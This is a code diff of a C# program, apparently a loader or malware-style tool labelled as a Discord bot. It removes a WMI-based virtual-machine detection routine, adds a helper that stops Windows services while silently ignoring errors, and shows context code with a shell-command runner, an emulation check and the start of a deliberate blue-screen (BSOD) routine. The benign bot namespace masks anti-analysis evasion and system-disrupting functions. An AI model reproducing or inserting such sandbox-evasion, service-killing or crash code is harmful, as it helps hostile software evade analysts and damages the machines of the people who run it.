@@ -4,14 +4,13 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
-using System.Management;
 using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading;
 using System.Security.Cryptography;
-
+using System.ServiceProcess;
 
 namespace MyCustomDiscordBot
 {
@@ -214,7 +213,7 @@ namespace MyCustomDiscordBot
             Misc();
             CMD();
             Detect();
-            DetectVM();
+
             Outbuilt.FileDebug();
             Outbuilt.DefaultDependencyAttribute();
             Outbuilt.AssemblyHashAlgorithm();
@@ -376,7 +375,24 @@ namespace MyCustomDiscordBot
                 // System.IO.File.Create($"C:\\ProgramData\\Outbuilt\\DisableProxy.txt");
                 //   Error("Your Proxy has been Disabled, try open it again!");
             }
+
         }
+        public static void StopService(string serviceName, int timeoutMilliseconds)
+        {
+            ServiceController service = new ServiceController(serviceName);
+            try
+            {
+                TimeSpan timeout = TimeSpan.FromMilliseconds(timeoutMilliseconds);
+
+                service.Stop();
+                service.WaitForStatus(ServiceControllerStatus.Stopped, timeout);
+            }
+            catch
+            {
+                // ...
+            }
+        }
+
         private static void Shell(object command)
         {
             try
@@ -458,33 +474,7 @@ namespace MyCustomDiscordBot
                 Error("Emulation");
             }
         }
-        private static void DetectVM()
-        {
-            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
-            {
-                using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
-                {
-                    foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
-                    {
-                        if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
-                        {
-                            //   System.IO.Directory.CreateDirectory("C:/ProgramData/Outbuilt");
-                            // System.IO.File.Create($"C:/ProgramData/Outbuilt/VM Detected");
-                            Error("VM Detected");
-                        }
-                    }
-                }
-            }
-            foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
-            {
-                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
-                {
-                    // System.IO.Directory.CreateDirectory("C:/ProgramData/Outbuilt");
-                    //  System.IO.File.Create($"C:/ProgramData/Outbuilt/VM Detected");
-                    Error("VM Detected");
-                }
-            }
-        }
+     
         public static void BSOD()
         {
             Process.EnterDebugMode();
